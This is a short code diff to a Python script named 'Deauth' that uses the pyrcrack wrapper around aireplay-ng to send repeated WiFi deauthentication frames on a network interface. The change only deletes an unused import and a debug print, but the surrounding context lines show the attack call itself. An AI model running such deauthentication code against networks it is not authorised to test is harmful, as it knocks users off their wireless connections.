@@ -1,5 +1,4 @@
 """Deauth"""
-import sys
 from contextlib import suppress
 import asyncio
 import pyrcrack
@@ -12,7 +11,6 @@ async def attack(interface, apo):
         async with pyrcrack.AireplayNg() as aireplay:
             await aireplay.run(interface['interface'], deauth=10, D=True)
             while True:
-                print(aireplay.meta)
                 await asyncio.sleep(2)
 
 
